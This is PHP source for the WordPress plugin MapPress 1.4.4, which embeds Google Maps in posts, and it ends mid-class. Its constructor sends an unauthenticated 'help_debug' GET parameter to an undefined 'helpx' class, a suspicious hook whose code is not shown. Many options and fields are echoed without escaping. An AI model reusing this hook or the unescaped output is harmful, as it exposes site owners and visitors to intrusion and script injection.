<?php                                                                                                                                                
/*
Plugin Name: MapPress Easy Google Maps
Plugin URI: http://www.wphostreviews.com/mappress
Author URI: http://www.wphostreviews.com/mappress
Description: MapPress makes it easy to insert Google Maps in WordPress posts and pages.
Version: 1.4.4
Author: Chris Richardson
*/

/*
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
*/

// ----------------------------------------------------------------------------------
// Class mappress - plugin class
// ----------------------------------------------------------------------------------
class mappress {
	var $plugin_name = "MapPress";                                // plugin display name
	var $prefix = 'mappress';                                     // plugin filenames
	var $wordpress_tag = 'mappress-google-maps-for-wordpress';    // tag assigned by wordpress.org
	var $version = '1.4.4';
	var $widget_defaults = array ('title' => 'MapPress Map', 'map_single' => 0, 'map_multi' => 1, 'width' => 200, 'height' => 200, 'googlebar' => 0);
	var $map_defaults = array ('icons_url' => '', 'api_key' => '', 'server' => 'http://maps.google.com', 'country' => '', 'width' => 400, 'height' => 300, 'zoom' => 0,
								'address_format' => 'ENTERED', 'bigzoom' => 1, 'googlebar' => 1,
								'maptypes' => 0, 'directions' => 1, 'initial_maptype' => 'normal', 'streetview' => 1, 'traffic' => 1, 'open_info' => 0, 'default_icon' => '', 'poweredby' => 1);
	
	var $debug = false;
	var $div_num = 0;    // Current map <div>
	var $plugin_page = '';
	
	function mappress()  {        
		global $wpdb, $wp_version;
		
		// This plugin doesn't work for feeds!
		if (is_feed())
			return;
		
		// Define constants for pre-2.6 compatibility
		if ( ! defined( 'WP_CONTENT_URL' ) )
			  define( 'WP_CONTENT_URL', $this->get_option( 'siteurl' ) . '/wp-content' );
		if ( ! defined( 'WP_CONTENT_DIR' ) )
			  define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
		if ( ! defined( 'WP_PLUGIN_URL' ) )
			  define( 'WP_PLUGIN_URL', WP_CONTENT_URL. '/plugins/' );
		if ( ! defined( 'WP_PLUGIN_DIR' ) )
			  define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );
			
		// Localization 
		if( version_compare( $wp_version, '2.7', '>=') ) 
			load_plugin_textdomain($this->prefix, false, $this->wordpress_tag . '/languages');    
		else
			load_plugin_textdomain($this->prefix, "wp-content/plugins/$this->wordpress_tag/languages");        
	
		// Notices
		add_action('admin_notices', array(&$this, 'hook_admin_notices'));
		
		// Install and activate
		register_activation_hook(__FILE__, array(&$this, 'hook_activation'));    
		add_action('admin_menu', array(&$this, 'hook_admin_menu'));

		// Post hooks and shortcode processing
		add_shortcode($this->prefix, array(&$this, 'map_shortcodes'));
		add_action('save_post', array(&$this, 'hook_save_post'));                

		// Load non-admin scripts
		add_action("wp_print_scripts", array(&$this, 'hook_print_scripts'));                				
				
		// Uninstall
		if ( function_exists('register_uninstall_hook') )
			register_uninstall_hook(__FILE_, array(&$this, 'hook_uninstall'));
						
		// Initialize options & help
		$this->options_init();
		$this->helper = new helpx();
		
		if (isset($_GET['help_debug'])) {
			$this->helper->get_info($_GET['help_debug']);
			$this->debug = true;
		}                      
	}

	/**
	* Add admin menu and admin scripts/stylesheets
	* Admin script - post edit and options page
	* Content script - content (and also post-edit for minimap)
	* CSS - content, plugins, post-edit 
	* 
	*/
	function hook_admin_menu() {
		// Add menu
		$mypage = add_options_page($this->plugin_name, $this->plugin_name, 8, __FILE__, array(&$this, 'admin_menu'));       
		$this->plugin_page = $mypage;				
		
		// Post edit shortcode boxes - note that this MUST be admin_menu call
		add_meta_box($this->prefix, $this->plugin_name, array(&$this, 'shortcode_form'), 'post', 'normal', 'high');
		add_meta_box($this->prefix, $this->plugin_name, array($this, 'shortcode_form'), 'page', 'normal', 'high');        					

		// Add scripts & styles for admin pages
		add_action("admin_print_scripts-$mypage", array(&$this, 'hook_admin_print_scripts'));        
		add_action("admin_print_scripts-post.php", array(&$this, 'hook_admin_print_scripts'));
		add_action("admin_print_scripts-post-new.php", array(&$this, 'hook_admin_print_scripts'));        
		add_action("admin_print_scripts-page.php", array(&$this, 'hook_admin_print_scripts'));        
		add_action("admin_print_scripts-page-new.php", array(&$this, 'hook_admin_print_scripts'));                
		add_action("admin_print_styles", array(&$this, 'hook_admin_print_styles'));                				
	}

	/**
	* Scripts for non-admin screens
	* 
	*/
	function hook_print_scripts() {	
		// Only load for non-admin, non-feed
		if (is_admin() || is_feed())	
			return;
			
		// Only load scripts if at least one post has map coordinates (we don't check if map shortcode is present, though)
		if (!$this->has_maps())
			return;
			
		$key = $this->get_array_option('api_key', 'map_options');
			
		if (!empty($key))
			wp_enqueue_script('googlemaps', "http://maps.google.com/maps?file=api&amp;v=2&amp;key=$key");            
			
		wp_enqueue_script($this->prefix, $this->plugin_url($this->prefix . '.js'), FALSE, $this->version);
		wp_enqueue_script('mapcontrol', $this->plugin_url('mapcontrol.js'), FALSE, $this->version);        
		
		// Stylesheet
		if(function_exists('wp_enqueue_style'))
			wp_enqueue_style($this->prefix, $this->plugin_url("$this->prefix.css"), FALSE, $this->version);  
			
		// Localize script texts
		wp_localize_script($this->prefix, $this->prefix . 'l10n', array(
			'dir_400' => __('Google error: BAD REQUEST', $this->prefix),
			'dir_500' => __('Google internal error.  Try again later.', $this->prefix),
			'dir_601' => __('The starting or ending address was missing.', $this->prefix),
			'dir_602' => __('The starting or ending address could not be found.  Please check that the address is correct and completely entered.', $this->prefix),
			'dir_603' => __('Google cannot return those directions for legal or contractual reasons', $this->prefix),
			'dir_604' => __('Google cannot return directions between those addresses.  There is no route between them or the routing information is not available.', $this->prefix),
			'dir_610' => __('Invalid map API key', $this->prefix),
			'dir_620' => __('Your key has issued too many queries in one day.', $this->prefix),
			'dir_default' => __('Unknown error, unable to return directions.  Status code = ', $this->prefix),
			'no_address' => __('No matching address', $this->prefix),
			'did_you_mean' => __('Did you mean: ', $this->prefix),
			'street_603' => __('Error: your browser does not seem to support the street view Flash player', $this->prefix),
			'street_600' => __('Sorry, no street view data is available for this location', $this->prefix),
			'street_default' => __('Sorry, Google was unable to display the street view in your browser', $this->prefix),
			'street_view' => __('Street view', $this->prefix),
			'directions' => __('Directions', $this->prefix),
			'address' => __('Address', $this->prefix),
			'to_here' => __('to here', $this->prefix),
			'from_here' => __('from here', $this->prefix),
			'get_directions' => __('Get directions', $this->prefix)
		));  		
		
		// Add action to load our geocoder and icons declarations that can't be enqueued
		add_action('wp_head', array(&$this, 'hook_head'));           		       				
	}
	
	/**
	* Scripts only for our specific admin pages
	* 
	*/
	function hook_admin_print_scripts() {
		// We need maps API to validate the key on options page; key may be being updated in $_POST when we hit this event
		if ($_POST['api_key'])
			$key = $_POST['api_key'];
		else        
			$key = $this->get_array_option('api_key', 'map_options');
		
		// Google maps library, geocoder and icons
		if (!empty($key))
			wp_enqueue_script('googlemaps', "http://maps.google.com/maps?file=api&amp;v=2&amp;key=$key");
			
		// Scripts for admin screens
		wp_enqueue_script($this->prefix . '_admin', $this->plugin_url($this->prefix . '_admin.js'), array('jquery-ui-core', 'jquery-ui-dialog'), $this->version);
		
		wp_localize_script($this->prefix . '_admin', $this->prefix . 'l10n', array(
			'api_missing' => __('Please enter your API key. Need an API key?  Get one ', $this->prefix),
			'api_incompatible' => __('MapPress could not load google maps.  Either your browser is incompatible or your API key is invalid.  Need an API key?  Get one ', $this->prefix),
			'here' => __('here', $this->prefix),
			'no_address' => __('No matching address', $this->prefix),
			'address_exists' => __('That address is already on the map : ', $this->prefix),
			'edit' => __('Edit', $this->prefix),
			'save' => __('Save', $this->prefix),
			'cancel' => __('Cancel', $this->prefix),
			'del' => __('Delete', $this->prefix),
			'enter_address' => __('Please enter an address', $this->prefix),
			'title' => __('Title', $this->prefix),
			'delete_this_marker' => __('Delete this map marker?', $this->prefix),
			'select_icon' => __('Please select an icon or click to close: ', $this->prefix)
		));				
		// Add action to load our geocoder and icons declarations that can't be enqueued
		add_action('admin_head', array(&$this, 'hook_head'));        				
	}    

	function hook_admin_print_styles() {
		if(function_exists('wp_enqueue_style'))
			wp_enqueue_style($this->prefix, $this->plugin_url("$this->prefix.css"), FALSE, $this->version);          
	}

	/**
	* Add js declarations since they can't be 'enqueued', needed by both admin and regular pages
	* 
	*/
	function hook_head() {            					
		// Geocoder & icons (only load if API key specified)
		$key = $this->get_array_option('api_key', 'map_options');
		if (!empty($key)) {
			echo "\r\n<script type='text/javascript'> var mappGeocoder = new GClientGeocoder();";
			$country = $this->get_array_option('country', 'map_options');
			if (!empty($country))
				echo "mappGeocoder.setBaseCountryCode('$country'); ";
			echo "</script>";
				
			$this->icons = $this->get_array_option('icons');
			
			// Only declare the icons needed to render current page        
			$default_icon = $this->get_array_option('default_icon', 'map_options');
			$needed_icons = $this->icons[$default_icon];
					
			if ($needed_icons)
				mpicon::draw($needed_icons);            
		}
	}
	
	function hook_activation() {   
		// upgrade
		$current_version = $this->get_array_option('version');

		// If version number was not set or is prior to 1.3, upgrade option values
		if ($current_version == false || $current_version < '1.3') {
						
			foreach($this->map_defaults as $key=>$value) {
				$current_value = $this->get_array_option($key);
				if (isset($current_value) && $current_value !== false) {
					$map_options[$key] = $current_value;
				}
			}                
			
			// Delete the old option format
			delete_option('mappress');
			
			// Add the new options format
			$map_options['googlebar'] = 1;
			$this->update_array_option('map_options', $map_options);            
			
			// We'll assume another version was installed if API_KEY isn't empty
			// In that case, warn the user to upgrade his maps
			$key = $this->get_array_option('api_key', 'map_options');
		}

		// Delete default map zoom if it exists 
		if ($current_version < '1.4.3') {
			$map_options = $this->get_array_option('map_options');
			$map_options['zoom'] = 0;
			$this->update_array_option('map_options', $map_options);
		}
		
		// Save current version #
		$this->update_array_option('version', $this->version);
	}
	
	/**
	* Delete all option on uninstall
	* 
	*/
	function hook_uninstall() {
		update_options($this->prefix, '');
	}
								 
	/**
	 * Hook: save_post 
	 */
	function hook_save_post($post_id) {  
	
		// This hook gets triggered on autosave, but WP doesn't populate all of the _POST variables (sigh)
		// so, ignore it if we had no data sent (check w/arbitrary field that's always present)
		if (!isset($_POST['mapp_width']))
			return;
			
		delete_post_meta($post_id, '_mapp_map');
		delete_post_meta($post_id, '_mapp_pois');
		
		// $_POST values may include empty strings, but we need to filter them out for shortcode_atts() calls later)
		if (!empty($_POST['mapp_width']))
			$map['width'] = $_POST['mapp_width'];
		if (!empty($_POST['mapp_height']))
			$map['height'] = $_POST['mapp_height'];
		if (!empty($_POST['mapp_zoom']))
			$map['zoom'] = $_POST['mapp_zoom'];
			
		foreach($_POST['mapp_poi_address'] as $key=>$address) {
			// Get the hidden fields for the POI. 
			$caption = $_POST['mapp_poi_caption'][$key];
			$body = $_POST['mapp_poi_body'][$key];
			$corrected_address = $_POST['mapp_poi_corrected_address'][$key];
			$lat = $_POST['mapp_poi_lat'][$key];
			$lng = $_POST['mapp_poi_lng'][$key];

			// If somehow we didn't get lat/lng then skip this POI
			if (empty($lat) || empty($lng))
				continue;
										
			// Add the POI to our array for the metadata
			$pois[] = array('address' => $address, 'caption' => $caption, 'body' => $body,
							'corrected_address' => $corrected_address, 'lat' => $lat, 'lng' => $lng);
		}

		update_post_meta($post_id, '_mapp_map', $map);
		update_post_meta($post_id, '_mapp_pois', $pois);
	}
	
	/**
	* Hook: admin notices
	* Used for upgrade notification
	*/
	function hook_admin_notices() {        
		global $pagenow;
		
		// Check if API key entered; it may be in process of being updated
		if ($_POST['api_key'])
			$key = $_POST['api_key'];
		else        
			$key = $this->get_array_option('api_key', 'map_options');
		
		if (empty($key)) {
			echo "<div id='error' class='error'><p>" 
			. __("MapPress isn't ready yet.  Please enter your Google Maps API Key on the ", $this->prefix) 
			. "<a href='options-general.php?page={$this->wordpress_tag}/{$this->prefix}'>"
			. __("MapPress options screen.", $this->prefix) . "</a></p></div>";
			
			return;
		}		
	}            
	   
	function has_maps() {
		global $posts;  
		
		$found = false;
		foreach($posts as $key=>$post)
			if (get_post_meta($post->ID, '_mapp_pois', true))
				$found = true;
			
		return $found;
	}
	
	/**
	* Shortcode form for post edit screen
	* 
	*/
	function shortcode_form($post) {
		$map = get_post_meta($post->ID, '_mapp_map', true);
		$pois = get_post_meta($post->ID, '_mapp_pois', true);
				
		// Display the map header settings
		?>
			<div>
				<table id='mapp_header'>
					<thead>
						<tr>
							<th colspan="3" style="width:100%; text-align:left; font-weight: normal">
								<b><?php _e('Map options ', $this->prefix) ?></b>
								<?php _e('(leave blank for default)', $this->prefix)?>
							</th>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><label for="mapp_width" style="vertical-align: top"><?php _e('Width ', $this->prefix)?></label><input type="text" size="2" name="mapp_width" id="mapp_width" value="<?php echo $map['width'] ?>" /></td>
							<td><label for="mapp_height" style="vertical-align: top"><?php _e('Height ', $this->prefix)?></label><input type="text" size="2" name="mapp_height" id="mapp_height" value="<?php echo $map['height'] ?>" /></td>
							<td><label for="mapp_zoom" style="vertical-align: top"><?php _e('Zoom ', $this->prefix)?></label><?php $this->shortcode_dropdown_zoom('mapp_zoom', $map['zoom']); ?></td>
						</tr>
					</tbody>
				</table>
				<p class="submit" style="padding: 0; float: none" >
					<input type="button" id="mapp_insert" onclick="return mappInsertShortCode()" value="<?php _e('Insert map in post &raquo;', $this->prefix); ?>" />
				</p>
				
				<br />
				<?php // Display the Input fields ?>            
				
				<?php _e('Address', $this->prefix) ?><input style="width:100%" type="text" name="mapp_input_address" id="mapp_input_address" value="<?php echo $poi['address'] ?>" />
							
				<p class="submit" style="padding: 0; float: none">
					<input type="button" id="mapp_addrow" onclick="mappAddMarker(); return false" value="<?php _e('Add address', $this->prefix) ?>" />
				</p>
				<p id="mapp_message"></p>                    
			</div>  
			
			<br />
			<div id="admin-map-div" class="mapp-div" style="width: 100%; height: 300px"></div>
		<?php  
				
		// Load the minimap
		$minimap = "<script type='text/javascript'> \r\n";
		$minimap .= "pois = new Array();\r\n";

		foreach($pois as $key=>$poi) { 
			if ($poi['lat'] && $poi['lng']) {
				
				$caption = htmlentities($poi['caption'], ENT_QUOTES, 'UTF-8');
				$address = htmlentities($poi['address'], ENT_QUOTES, 'UTF-8');
				$corrected_address = htmlentities($poi['corrected_address'], ENT_QUOTES, 'UTF-8');
				$body = htmlentities($poi['body'], ENT_QUOTES, 'UTF-8');

				$minimap .= "p = { address : \"$address\", corrected_address : \"$corrected_address\", lat : \"{$poi['lat']}\", lng : \"{$poi['lng']}\", "
					 . "caption : \"$caption\", body : \"$body\", icon : \"{$poi['icon']}\" } ; "
					 . "pois.push(p); \r\n"; 
			}
		}
		
		// Fill in any blank map settings from options defaults
		// Merge options: map defaults >> map_options() >> settings for current map
		$map_args = $this->map_defaults;
		$map_args = shortcode_atts($map_args, $this->get_array_option('map_options'));
		$map_args = shortcode_atts($map_args, $map);
				
		$minimap .= "adminMap = new minimapp(pois, '{$map_args['width']}', '{$map_args['height']}', '{$map_args['address_format']}', '{$map_args['zoom']}') \r\n";
		$minimap .= "</script>\r\n";        
		echo $minimap; 
		
		// The <div> will be filled in with the list of POIs
		echo "<div id='admin_poi_div'></div>";
	}
	
	/**
	* Shortcode form - display zoom dropdown
	* This function is used only in the post edit screen, not in options screen
	*/
	function shortcode_dropdown_zoom($name, $value) {
		$keys = array(	''=>__('Automatic', $this->prefix), '1'=>__('1 - zoomed out', $this->prefix), 
						'2'=>'2', '3'=>'3', '4'=>'4', '5'=>'5', '6'=>'6', '7'=>'7', '8'=>'8', '9'=>'9', '10'=>'10', '11'=>'11', '12'=>'12', '13'=>'13', '14'=>'14', '15'=>'15', '16'=>'16', 
						'17'=>'17', '18'=>'18', '19'=>'19', '20'=>__('20 - zoomed in', $this->prefix));
		
		echo "<select id='$name' name='$name'>";

		foreach ($keys as $key => $description) {
			if ($key == $value)
				$selected = "selected";
			else
				$selected = "";
				
			echo "<option value='" . htmlentities($key, ENT_QUOTES, 'UTF-8') . "' $selected>$description</option>";        
		}
		echo "</select>";
	}

									 
	/**
	* Map a shortcode in a post.  Called by WordPress shortcode processor.
	* 
	* @param mixed $atts - shortcode attributes
	*/
	function map_shortcodes($atts='') {        
		global $id;
		
		if (is_feed())
			return;
			
		// Map data is stored only in post metadata fields so shortcode atts are empty
		$map = get_post_meta($id, '_mapp_map', true);
		$pois = get_post_meta($id, '_mapp_pois', true);
	
		// Merge options: map defaults >> map_options() >> settings for current map
		$map_args = $this->map_defaults;
		$map_args = shortcode_atts($map_args, $this->get_array_option('map_options'));
		$map_args = shortcode_atts($map_args, $map);
		
		$map = new mpmap($map_args);
		 
		if (is_array($pois)) {
			foreach($pois as $poi) {
				// Merge options: POI defaults >> get_options() >> POI metadata
				$poi_args = get_class_vars('mppoi');
				$poi_args = shortcode_atts($poi_args, $this->get_array_option('map_options'));
				$poi_args = shortcode_atts($poi_args, $poi);
				$map->add_poi($poi_args);
			}
		}

		// If any pois were found then return the script to draw the map
		if (count($map->pois) > 0) {
			$this->div_num++;  // Increment <div> number for next call
			return $map->draw($this->prefix . $this->div_num);                        
		}
	} 

		
	/**
	* Get plugin url
	*/
	function plugin_url ($path) {
		if (function_exists('plugins_url'))
			return plugins_url("$this->wordpress_tag/$path");
		else
			return WP_PLUGIN_URL . "$this->wordpress_tag/$path";
	}
	
	/**
	* Get option value.  Options are stored under a single key
	*/
	function get_array_option($option, $subarray='') {
		$options = get_option($this->prefix);        

		if ($subarray)
			$result = $options[$subarray][$option];
		else
			$result = $options[$option];                 
			
		// For empty options, return false, just like standard routine
		if (!isset($result))
			return false;

		return $result;
	}

	/**
	* Set option value.  Options are stored as an array under a single key
	*/
	function update_array_option($option, $value) {        
		$options = get_option($this->prefix);
		$options[$option] = $value;        
		update_option($this->prefix, $options);
	}
	
	/**
	* Delete option value from option array.
	* 
	*/
	function delete_array_option($option) {
		$options = get_option($this->prefix);
		if (isset($options[$option])) {
			unset ($options[$option]);
			update_option($this->prefix, $options);
			return true;
		}
		
		return false;
	}
	
	/**
	* Initialize any null or missing options with defaults
	*  
	*/
	function options_init() {
		$map_options = shortcode_atts($this->map_defaults, $this->get_array_option('map_options'));
		$this->update_array_option('map_options', $map_options);
	}   
		
	/**
	* Options page
	*     
	*/
	function admin_menu() {
		if ( !current_user_can('manage_options') ) 
			die ( __( "ACCESS DENIED: You don't have permission to do this.", $this->plugin_name) );
			
		// If user hasn't specificed a URL for the icons, use plugin directory
		$url = $this->get_array_option('icons_url', 'plugin_options');
		if (empty($url) || $url == false)
			$url = plugins_url($this->wordpress_tag . '/icons');
		
		// Read icons
		$this->icons = mpicon::read($url, 'icons.txt');
		if ($this->icons === false)
			$error = "Unable to read icons.  Check that the icons.txt file exists and does not have any errors.";

		// Save options
		if (isset($_POST['save'])) {    
			check_admin_referer($this->prefix);
			
			foreach($_POST as $key=>$value) 
				if (!empty($_POST[$key]) || $_POST[$key] === '0')
					$new_values[$key] = strip_tags(mysql_real_escape_string ($_POST[$key]));
					
			$map_options = shortcode_atts($this->map_defaults, $new_values);
			$this->update_array_option('map_options', $map_options);
			
			// Save the icons that we loaded
			$this->update_array_option('icons', $this->icons);
						
			$message = __('Settings saved', $this->prefix);                        
		}
	
		$map_options = shortcode_atts($this->map_defaults, $this->get_array_option('map_options'));
		$icons = $this->get_array_option('icons');
		$cctld_link = '(<a target="_blank" href="http://en.wikipedia.org/wiki/CcTLD#List_of_ccTLDs">' . __("what's my country code?", $this->prefix) . '</a>)';
		$help_msg = $this->get_array_option('help_msg');
	?>
	<div class="wrap">
		<div id="icon-options-general" class="icon32"><br /></div>        
			<h2><?php _e('MapPress Options', $this->prefix) ?></h2>
			<?php $this->show_messages($message, $error); ?>            
			<div><a target='_blank' href='http://wphostreviews.com/mappress/mappress-documentation'><?php _e('MapPress help', $this->prefix)?></a></div>

			<form method="post" action="">                  
				<?php wp_nonce_field($this->prefix); ?>
				
				<h4><?php _e('Google Maps API Key', $this->prefix);?></h4><p>
															
				<table class="form-table">    
					<tr valign='top'>
						<td id='api_block'><input type='text' id='api_key' name='api_key' size='110' value='<?php echo $map_options['api_key']; ?>'/>
						<p id='api_message'></p>                        
						</td>
					</td>                        
					<script type='text/javascript'>
						mappCheckAPI()
					</script>
				</table>

				<h4><?php _e('Map defaults', $this->prefix);?></h4>
				
				<table class="form-table">                                    
					<?php $this->option_string(__('Map width', $this->prefix), 'width', $map_options['width'], 2, __('Enter a value in pixels (default is 400)', $this->prefix)); ?>
					<?php $this->option_string(__('Map height', $this->prefix), 'height', $map_options['height'], 2, __('Enter a value in pixels (default is 300)', $this->prefix)); ?>
					<?php $this->option_dropdown(__('Address format', $this->prefix), 'address_format', $map_options['address_format'], 
						array('ENTERED' => __('Exactly as entered', $this->prefix), 'CORRECTED' => __('Corrected address', $this->prefix))); 
					//	'NOCOUNTRY' => __('Corrected address without country'), 'NOUSA' => __('Corrected address without "USA"', $this->prefix))); ?>
				</table>        
				
				<h4><?php _e('Advanced Settings', $this->prefix); ?></h4>
				
				<table class="form-table">                                    
					<?php $this->option_string(__('Country code for searches', $this->prefix), 'country', $map_options['country'], 2, __('Enter a country code to use as a default when searching for an address.', $this->prefix) . "<br />" . $cctld_link); ?>
					<?php $this->option_checkbox(__('Directions', $this->prefix), 'directions', $map_options['directions'], __('Check to enable directions to/from map markers', $this->prefix)); ?>										<?php $this->option_checkbox(__('Big map controls', $this->prefix), 'bigzoom', $map_options['bigzoom'], __('Check to show large map controls; uncheck for a small zoom control instead', $this->prefix)); ?>                    
					<?php $this->option_checkbox(__('Map types button', $this->prefix), 'maptypes', $map_options['maptypes'], __('Check to enable the "map types" button on the map', $this->prefix)); ?>
					<?php $this->option_dropdown(__('Initial map type', $this->prefix), 'initial_maptype', $map_options['initial_maptype'], array( 
						'normal' => 'Street', 'satellite' => 'Satellite', 'hybrid' => 'Hybrid (street+satellite)', 'physical' => 'Terrain'),
						__('Choose the map type to use when the map is first displayed', $this->prefix)); ?>                    
					<?php //$this->option_checkbox(__('Traffic button', $this->prefix), 'traffic', $map_options['traffic'], __('Check to enable the real-time traffic button on the map', $this->prefix)); ?>                                        
					<?php //$this->option_checkbox(__('Street view link', $this->prefix), 'streetview', $map_options['streetview'], __('Check to enable the "street view" link for map markers', $this->prefix)); ?>
					<?php $this->option_checkbox(__('Initial marker', $this->prefix), 'open_info', $map_options['open_info'], __('Check to open the first marker when the map is displayed.', $this->prefix)); ?>
					<?php $this->option_checkbox(__('GoogleBar', $this->prefix), 'googlebar', $map_options['googlebar'], __('Check to show the "GoogleBar" search box for local business listings.', $this->prefix)); ?>                                        
					<?php $this->option_checkbox(__('MapPress link', $this->prefix), 'poweredby', $map_options['poweredby'], __('Enable the "powered by" link.', $this->prefix)); ?>
					<?php //$this->option_string(__('Icons URL', $this->prefix), 'icons_url', $map_options['icons_url'], 40, '<br/>' . __('URL to custom icon definitions.  Leave blank for the default:', $this->prefix) . plugins_url('/' . $this->wordpress_tag . '/icons')); ?>                                                      
					<?php               
						$default_icon_id = $map_options['default_icon'];
						$default_icon = $this->icons[$default_icon_id];
						$image_url = $default_icon->image;
						if (empty($image_url))
							$image_url = "http://maps.google.com/mapfiles/ms/micons/red-dot.png";
					?>
					<tr valign='top'><th scope='row'><?php _e('Default map icon: ', $this->prefix); ?></th>
					<td>
						<input type="hidden" name="default_icon" id="default_icon" value="<?php echo $default_icon->id ?>"/>
						<a href="javascript:void(0)"><img id="icon_picker" src="<?php echo $image_url ?>" alt="<?php echo $default_icon->id ?> title="<?php echo $default_icon->id ?>" /></a>
						<?php _e('(click the icon to choose)', $this->prefix) ?>

						<div class='mapp-icon-list' id='mapp_icon_list'>
							<ul>
								<?php
									foreach ($this->icons as $key => $icon) { 
										if ($icon->image)
											$image_url = $icon->image;
										else
											$image_url = 'http://maps.google.com/mapfiles/ms/micons/red-dot.png';
										$shadow_url = $icon->shadow;
										$id = $icon->id;
								?>                            
									<li><a><img src="<?php echo $image_url ?>" alt="<?php echo $id ?>" title="<?php echo $description ?>" id="<?php echo $icon->id?>" /></a></li>
								<?php   
									}
								?>
							</ul>                                        
						</div>    
					</td>
				</table>               
									 
				<p class="submit"><input type="submit" class="submit" name="save" value="<?php _e('Save Changes', $this->prefix) ?>"></p>
			</form>
		</div>
		<p><small>&copy; 2009, <a href="http://www.wphostreviews.com/mappress">C. Richardson</a></small></p>
	</div>	    
	<?php        
	}


	
	/** 
	* Options - show messages, if any
	* 
	*/
	function show_messages ($message, $error) {
		if (!empty($message))
			echo "<div id='message' class='updated fade'><p>$message</p></div>";
		if (!empty($error))
			echo "<div id='error' class='error'><p>$error</p></div>";
	}
				
	/**
	* Options - display option as a field
	*/
	function option_string($label, $name, $value='', $size='', $comment='', $class='') {
		if (!empty($class))
			$class = "class='$class'";

		echo "<tr valign='top'><th scope='row'>" . $label . "</th>";
		echo "<td $class><input type='text' id='$name' name='$name' value='$value' size='$size'/> $comment</td>";
		echo "</tr>";
	}
			
	/**
	* Options - display option as a radiobutton
	*/
	function option_radiobutton($label, $name, $value='', $keys, $comment='') {
		echo "<tr valign='top'><th scope='row'>" . $label . "</th>";    
		echo "<td>";
				
		foreach ($keys as $key => $description) {
			if ($key == $value) 
				$checked = "checked";
			else
				$checked = "";               
			echo "<input type='radio' id='$name' name='$name' value='" . htmlentities($key, ENT_QUOTES, 'UTF-8') . "' $checked />" . $description . "<br>";            
		}
		echo $comment . "<br>";
		echo "</td></tr>"; 
	}

	/**
	* Options - display option as a checkbox
	*/
	function option_checkbox($label, $name, $value='', $comment='') {
		if ($value)
			$checked = "checked";
		echo "<tr valign='top'><th scope='row'>" . $label . "</th>";    
		echo "<td><input type='hidden' id='$name' name='$name' value='0' /><input type='checkbox' name='$name' value='1' $checked />";
		echo " $comment</td></tr>";          
	}    
	
	/**
	* Options - display as dropdown
	*/
	function option_dropdown($label, $name, $value, $keys, $comment='') {    
		echo "<tr valign='top'><th scope='row'>" . $label . "</th>";    
		echo "<td><select name='$name'>";

		foreach ($keys as $key => $description) {
			if ($key == $value)
				$selected = "selected";
			else
				$selected = "";
				
			echo "<option value='" . htmlentities($key, ENT_QUOTES, 'UTF-8') . "' $selected>$description</option>";        
		}
		echo "</select>";
		echo " $comment</td></tr>";
	}	
}  // End plugin class 

class mpicon {
	var     $id,
			$description,
			$image,
			$shadow,
			$iconSize,
			$shadowSize,
			$iconAnchor,
			$infoWindowAnchor,
			$transparent;
			
	function mpicon($args = '') {
		$properties = get_class_vars('mpicon');
		shortcode_atts($properties, $args);
			 
		foreach ($properties as $key=>$value)
			$this->$key = $args[$key];
	}   
	
	function draw($icons) {
		if (!is_array($icons))
			$icons = array($icons);
			
		echo "<script type='text/javascript'>";
		echo "\r\n var mappIcons = []; \r\n var baseIcon = new GIcon(G_DEFAULT_ICON); baseIcon.iconSize = new GSize(32, 32); baseIcon.shadowSize = new GSize(59,32); baseIcon.iconAnchor = new GPoint(16,32);"; 
		foreach ($icons as $icon) { 
			echo "var i = new GIcon(baseIcon);";
			
			if ($icon->image)
				echo "i.image = '$icon->image'; ";
			if ($icon->shadow)
				echo "i.shadow = '$icon->shadow'; ";
			if ($icon->iconSize)
				echo "i.iconSize = new GSize({$icon->iconSize->x}, {$icon->iconSize->y}); ";
			if ($icon->shadowSize)
				echo "i.shadowSize = new GSize({$icon->shadowSize->x}, {$icon->shadowSize->y}); ";            
			if ($icon->iconAnchor)
				echo "i.iconAnchor = new GPoint({$icon->iconAnchor->x}, {$icon->iconAnchor->y}); ";            
			if ($icon->infoWindowAnchor)
				echo "i.infoWindowAnchor = new GPoint({$icon->infoWindowAnchor->x}, {$icon->infoWindowAnchor->y}); ";          
			if ($icon->transparent)
				echo "i.transparent = '$icon->transparent';" ;
			echo " mappIcons['$icon->id'] = i;";
		}
								
		echo "\r\n</script>";
	}
	
	function read($url, $filename) {                
		
		// ------------------------- 1.4.3 ----------------------------
		$default = new mpicon(array('id' => ''));
		
		$yellow = new mpicon(array('id' => 'yellow-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/yellow-dot.png'));
		$blue = new mpicon(array('id' => 'blue-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/blue-dot.png'));
		$green = new mpicon(array('id' => 'green-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/green-dot.png'));
		$ltblue = new mpicon(array('id' => 'ltblue-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/ltblue-dot.png'));        
		$pink = new mpicon(array('id' => 'pink-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/pink-dot.png'));                
		$purple = new mpicon(array('id' => 'purple-dot.png', 'image' => 'http://maps.google.com/mapfiles/ms/micons/purple-dot.png'));                        
		$icons = array($default->id => $default, $yellow->id => $yellow, $blue->id => $blue, $ltblue->id => $ltblue, $pink->id => $pink, $purple->id => purple);
		return $icons;                        
// crp
//		// Read the custom icon file for detailed specs of custom icons
//		$fp = fopen($url . '/' . $filename, 'r');
//		if (!$fp)
//			return false;
//		
//		$data = '';    
//		while (!feof($fp)) {
//			$line = fgets($fp, 2000);
			// Skip comment lines
//			if (empty($line) || substr($line,0,2) == '//')
//				continue;
//			else
//				$data .= $line;                
//		}

		// Strip whitespace and decode JSON
//		$data = str_replace(array("\n", "\r", "\t", " "), '', $data);
//		$icons = json_decode($data);
//		
//		if ($icons == null || empty($icons))
//			return false;
//		
//		foreach($icons as $icon) {
			// Prefix image & shadow name with the icons URL
//			if ($icon->image)
//				$icon->image = $url . '/' . $icon->image;
//			if ($icon->shadow)
//				$icon->shadow = $url . '/' . $icon->shadow;
//			$loaded_icons[$icon->id] = new mpicon(shortcode_atts(get_class_vars('mpicon'), $icon));
//		}

//		return $loaded_icons;
	}    
} // End class mpicon


class mppoi {
	var     $address,
			$caption,
			$body,
			$corrected_address, 
			$lat, 
			$lng, 
			$icon;
			
